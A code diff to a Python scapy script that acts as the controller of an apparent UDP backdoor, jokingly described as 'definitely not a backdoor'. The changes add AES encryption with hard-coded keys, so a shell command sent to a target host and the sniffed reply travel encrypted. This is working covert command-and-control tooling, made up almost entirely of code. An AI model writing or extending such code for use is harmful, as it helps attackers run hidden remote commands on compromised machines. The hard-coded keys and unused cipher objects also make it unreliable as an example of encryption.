@@ -1,9 +1,29 @@
 from scapy.all import *
 import argparse
+import base64
+from Crypto.Cipher import AES
 
 def packetFunc(packet):
-  print packet.load
+  # scapy is garbage and get's arp packet even though we're filtering
+  if ARP not in packet:
+    print "Got a packet"
+    encryptedData = packet['Raw'].load
+    data = decrypt(encryptedData)
+    print data
 
+MASTER_KEY = '12345678901234567890123456789012'
+
+def encrypt(thing):
+  secret = AES.new(MASTER_KEY)
+  tagString = str(thing) + (AES.block_size - len(str(thing)) % AES.block_size) * "\0"
+  cipherText = base64.b64encode(secret.encrypt(tagString))
+  return cipherText
+
+def decrypt(cipher_text):
+    dec_secret = AES.new(MASTER_KEY)
+    raw_decrypted = dec_secret.decrypt(base64.b64decode(cipher_text))
+    clear_val = raw_decrypted.rstrip("\0")
+    return clear_val
 
 parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
 parser.add_argument('-s'
@@ -25,6 +45,9 @@ args = parser.parse_args()
 
 command = "ls -l"
 sniffFilter = 'udp and dst port {0} and src port {1}' .format(args.sourcePort, args.destPort)
-packet = IP(dst=args.destIP)/UDP(dport=int(args.destPort), sport=int(args.sourcePort))/Raw(load=command)
+encryptionObject = AES.new('This is a key123', AES.MODE_CFB, 'This is an IV456')
+decryptionObject = AES.new('This is a key123', AES.MODE_CFB, 'This is an IV456')
+encryptedCommand = encrypt(command)
+packet = IP(dst=args.destIP)/UDP(dport=int(args.destPort), sport=int(args.sourcePort))/Raw(load=encryptedCommand)
 send(packet)
 sniff(filter=sniffFilter,prn=packetFunc, count=1)
